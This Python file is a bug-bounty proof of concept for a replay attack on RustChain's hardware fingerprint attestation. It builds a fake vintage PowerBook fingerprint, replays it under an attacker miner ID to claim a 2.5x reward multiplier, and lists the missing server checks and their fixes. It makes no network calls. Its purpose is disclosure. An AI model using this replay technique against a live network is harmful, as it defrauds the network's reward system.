# SPDX-License-Identifier: MIT
"""
RustChain Red Team — Hardware Fingerprint Replay Attack PoC
Bounty #2276: 150 RTC

Demonstrates that a captured fingerprint attestation from a legitimate
G4 PowerBook can be replayed from a modern x86 machine to claim the
2.5x antiquity bonus.

Attack vector:
1. Capture real fingerprint from legitimate hardware
2. Store the attestation payload (clock drift, cache timing, SIMD, thermal, jitter)
3. Replay the exact payload from a different machine
4. Current server accepts because it only validates data ranges, not freshness

This PoC does NOT perform DoS or destructive actions — surgical testing only.
"""

import copy
import hashlib
import json
import os
import time
from datetime import datetime
from typing import Dict, Optional, Tuple


def capture_fingerprint(endpoint: str = "", miner_id: str = "legit-g4-powerbook") -> Dict:
    """
    Simulate capturing a real G4 PowerBook fingerprint attestation.
    In a real attack, this data would be sniffed from network traffic
    or obtained from a compromised legitimate miner.

    Returns a realistic fingerprint payload matching RustChain's
    HardwareFingerprint format.
    """
    return {
        "miner_id": miner_id,
        "hardware_class": "vintage",
        "architecture": "powerpc",
        "cpu_model": "PowerPC G4 7447A",
        "cpu_family": "PowerPC",
        "attestation_time": time.time(),
        "clock_drift": {
            "mean_ns": 4523891.7,
            "variance": 127834.5,
            "stdev": 357.54,
            "drift_mean": 892.3,
            "drift_variance": 31204.8,
            "drift_hash": "a3f8c92e1b7d04e5",
            "samples": 1000,
            "valid": True,
        },
        "cache_timing": {
            "l1_latency_ns": 1.2,
            "l2_latency_ns": 4.8,
            "l3_latency_ns": 18.5,
            "l1_l2_ratio": 4.0,
            "l2_l3_ratio": 3.854,
            "pattern_hash": "7e2a4f1bc09d38a6",
            "iterations": 100,
            "valid": True,
        },
        "simd_identity": {
            "altivec_present": True,
            "sse_present": False,
            "avx_present": False,
            "neon_present": False,
            "unit_hash": "ppc_altivec_7447a",
            "throughput_mops": 823.4,
            "valid": True,
        },
        "thermal_profile": {
            "sensor_count": 2,
            "readings": [52.3, 48.7],
            "variance": 6.48,
            "drift_rate": 0.03,
            "signature": "thermal_ppc_g4_duo",
            "valid": True,
        },
        "instruction_jitter": {
            "mean_jitter_ns": 12.4,
            "stdev_jitter_ns": 3.8,
            "max_jitter_ns": 28.1,
            "jitter_hash": "9c4e7f2a1b83d056",
            "samples": 500,
            "valid": True,
        },
        "device_age": {
            "manufacture_year": 2004,
            "hardware_age_years": 22,
            "tier": "vintage",
            "multiplier": 2.5,
        },
        "anti_emulation": {
            "pipeline_depth_valid": True,
            "timing_consistency": 0.94,
            "entropy_score": 7.82,
            "is_emulated": False,
        },
    }


def replay_fingerprint(
    captured: Dict,
    new_miner_id: str = "attacker-x86-replay",
    modify_timestamp: bool = True,
) -> Dict:
    """
    Replay a captured fingerprint from a different machine.
    The attacker keeps ALL hardware data identical but changes
    miner_id and timestamp to appear as a fresh attestation.
    """
    replayed = copy.deepcopy(captured)
    replayed["miner_id"] = new_miner_id

    if modify_timestamp:
        replayed["attestation_time"] = time.time()

    # Attacker does NOT change hardware data — that's the point
    # The replayed payload has identical clock_drift, cache_timing, etc.
    return replayed


def mutate_replay(
    captured: Dict,
    server_nonce: str = "",
) -> Dict:
    """
    Advanced replay: attacker tries to inject a server nonce
    into the replayed data without re-running fingerprint collection.
    """
    replayed = replay_fingerprint(captured, "attacker-mutated-replay")
    if server_nonce:
        # Attacker tries to forge nonce binding
        replayed["server_nonce"] = server_nonce
        # But hardware data is still from the captured session
        replayed["nonce_hash"] = hashlib.sha256(
            (server_nonce + replayed["clock_drift"]["drift_hash"]).encode()
        ).hexdigest()[:16]
    return replayed


# ── Vulnerability analysis ────────────────────────────────────────

def analyze_current_vulnerability() -> Dict:
    """
    Documents what the current RustChain attestation server accepts/rejects.

    Current validation (fingerprint_checks.py) only checks:
    - Are drift values within expected ranges?
    - Are cache timings consistent with claimed architecture?
    - Is SIMD identity valid for the claimed CPU?
    - Are thermal readings plausible?
    - Are anti-emulation checks passing?

    It does NOT check:
    - Is this the same data seen before? (no replay detection)
    - Was this data generated NOW? (no freshness/nonce)
    - Does the data match the connecting machine? (no IP/TLS cross-check)
    """
    return {
        "vulnerability": "FINGERPRINT_REPLAY",
        "severity": "HIGH",
        "description": (
            "Attestation payloads are validated for range/format correctness "
            "but not for freshness or uniqueness. An attacker can capture a "
            "legitimate vintage hardware fingerprint and replay it indefinitely "
            "from any machine."
        ),
        "impact": (
            "Attacker claims 2.5x antiquity multiplier without owning any "
            "vintage hardware. At current rates, this means 2.5x RTC rewards "
            "per attestation cycle."
        ),
        "current_checks": [
            "drift_variance > 0 (real hardware has variance)",
            "cache_timing ratios match architecture profile",
            "SIMD identity matches claimed CPU",
            "thermal readings plausible (0-120°C)",
            "anti_emulation.is_emulated == False",
        ],
        "missing_checks": [
            "NO nonce-binding (payload not tied to server challenge)",
            "NO temporal correlation (no freshness proof)",
            "NO cross-check with connection metadata",
            "NO deduplication (same fingerprint accepted repeatedly)",
        ],
        "attack_cost": "Near zero — only need one captured payload",
        "defense_cost": "Low — server-side nonce + freshness + dedup",
    }


if __name__ == "__main__":
    print("=== RustChain Fingerprint Replay Attack PoC ===\n")

    # Step 1: Capture
    captured = capture_fingerprint()
    print(f"[1] Captured fingerprint from: {captured['miner_id']}")
    print(f"    Architecture: {captured['architecture']}")
    print(f"    Multiplier: {captured['device_age']['multiplier']}x")

    # Step 2: Replay
    replayed = replay_fingerprint(captured)
    print(f"\n[2] Replayed from: {replayed['miner_id']}")
    print(f"    Hardware data identical: {replayed['clock_drift'] == captured['clock_drift']}")

    # Step 3: Analysis
    vuln = analyze_current_vulnerability()
    print(f"\n[3] Vulnerability: {vuln['severity']}")
    print(f"    {vuln['description']}")
    print(f"\n    Missing checks:")
    for check in vuln["missing_checks"]:
        print(f"      - {check}")
